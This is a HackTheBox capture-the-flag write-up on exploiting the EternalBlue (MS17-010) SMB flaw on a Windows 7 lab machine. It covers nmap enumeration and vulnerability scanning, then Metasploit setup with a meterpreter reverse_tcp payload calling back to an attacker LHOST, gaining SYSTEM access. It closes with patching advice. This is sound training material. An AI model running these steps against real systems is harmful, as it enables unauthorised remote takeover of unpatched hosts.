# HTB - Blue

**IP Address:** `10.10.10.40`  
**OS:** Windows 7 Professional SP1  
**Difficulty:** Easy  
**Tags:** #SMB, #EternalBlue, #MS17-010, #Metasploit, #Windows-Exploitation

---
## Synopsis

Blue is an easy Windows machine vulnerable to the **EternalBlue (MS17-010)** SMB exploit.  
This vulnerability, leaked in 2017 by the Shadow Brokers group, was notably used in ransomware campaigns like **WannaCry** and **NotPetya**.  
Exploitation leads to direct remote code execution as `NT AUTHORITY\SYSTEM`, granting full control of the host.

---
## Skills Required

- Basic knowledge of Windows services and SMB
- Familiarity with vulnerability scanning using Nmap
- Understanding of Metasploit exploitation

## Skills Learned

- Identifying SMB and Windows versions via network enumeration
- Detecting MS17-010 vulnerability
- Exploiting Windows SMB vulnerabilities with Metasploit to gain SYSTEM access

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Verify if the host is alive using ICMP:

```bash
ping -c 1 10.10.10.40
```

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/ping.png]]

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

Scan all TCP ports to identify running services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/allPorts.png]]

Extract open ports from the result:

```bash
extractPorts allPorts
```

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/extractPorts.png]]

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p135,139,445 10.10.10.40 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/targeted.png]]

**Findings:**

| Port          | Service         | Description                          |
| ------------- | --------------- | ------------------------------------ |
| 135           | MS RPC          | Microsoft RPC endpoint mapper        |
| 139           | NetBIOS Session | Legacy SMB session service           |
| 445           | SMB             | Microsoft Windows SMB file sharing   |
| 49152 - 49157 | MS RPC          | Microsoft Windows RPC over high port |

- Port `445/tcp` is open and running **Microsoft Windows SMB**  
- The target OS is detected as **Windows 7 Professional SP1**, user `Haris`  
- Port 445 exposure on Windows 7 strongly suggests possible **MS17-010 (EternalBlue)** vulnerability

---
## 2. SMB Vulnerability Scanning

List Nmap NSE script categories:

```bash
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
```

![[nsa_files.png]]

From the output, the most relevant categories for vulnerability detection are **vuln** and **safe**.

Run Nmap with vulnerability detection scripts against port 445:

```bash
nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
```

![[nmap_vuln&safe.png]]

**Result:**  
The scan confirms the target is vulnerable to **MS17-010**.

---
## 3. Exploitation

Given the confirmed EternalBlue vulnerability, we can exploit it directly using **Metasploit**.

### 3.1 Launching Metasploit

```bash
msfconsole
```

![[msfconsole.png]]

Search for the MS17-010 EternalBlue module:

```bash
search ms17_010
```

![[search_ms17010.png]]

---
### 3.2 Configuring the Exploit

Set target parameters:

```bash
set RHOSTS 10.10.10.40
set LHOST 10.10.15.20
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

Select the EternalBlue module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```


![[payload.png]]

---
### 3.3 Executing the Exploit

Run the exploit:

```bash
exploit
```

![[exploit.png]]

The exploit succeeds, and we obtain a **Meterpreter** session as `NT AUTHORITY\SYSTEM`.

---
## 4. Post-Exploitation

### 4.1 User Flag

Navigate to the user's Desktop and retrieve the flag:

```bash
cd C:\Users\haris\Desktop
cat user.txt
```

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/user_flag.png]]

✅ **User flag obtained**

---
### 4.2 Root Flag

As we already have SYSTEM privileges, retrieve the root flag:

```bash
cd C:\Users\Administrator\Desktop
cat root.txt
```

![[GitHub Documentation/EASY/HTB_Blue_Writeup/screenshots/root_flag.png]]

✅ **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Port Scanning** → Detected SMB on port 445 with Windows 7 Professional SP1.  
2. **Vulnerability Scanning** → Confirmed MS17-010 (EternalBlue) vulnerability.  
3. **Metasploit Exploitation** → Used `exploit/windows/smb/ms17_010_eternalblue` for remote code execution.  
4. **Post-Exploitation** → Retrieved user and root flags with SYSTEM privileges.

---
## Defensive Recommendations

- Apply Microsoft’s security patch for **MS17-010** on all affected systems.  
- Disable or restrict access to SMBv1 where possible.  
- Segment the network to limit exposure of critical services.  
- Monitor and alert for anomalous SMB traffic patterns.
